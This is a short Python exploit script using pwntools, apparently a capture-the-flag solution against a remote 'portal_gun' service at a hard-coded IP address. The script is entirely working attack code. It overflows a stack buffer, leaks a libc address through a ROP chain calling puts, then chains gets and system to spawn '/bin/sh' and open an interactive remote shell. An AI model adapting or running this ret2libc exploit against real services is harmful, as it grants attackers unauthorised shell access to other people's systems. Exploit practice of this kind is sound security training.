#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('60.250.197.227', 10002)
#r = process('./portal_gun', env = {'LD_PRELOAD': './libc.so.6'})
#gdb.attach(proc.pidof(r)[0])

libc = ELF('./libc.so.6')

puts_plt = 0x400560
puts_got = 0x601018
gets_plt = 0x400580
system_plt = 0x400576
buf = 0x601100
pop_rdi = 0x4007a3
main = 0x4006FB

r.recvlines(2)

r.sendline(b'A' * 120 + flat(
    pop_rdi,
    puts_got,
    puts_plt,

    main
))

libc.address = u64(r.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['puts']
print(f'libc base address : {libc.address:x}')

r.recvlines(2)

r.sendline(b'A' * 120 + flat(
    pop_rdi,
    buf,
    gets_plt,

    pop_rdi,
    buf,
    libc.symbols['system']    
))

r.sendline('/bin/sh\x00')

r.interactive()
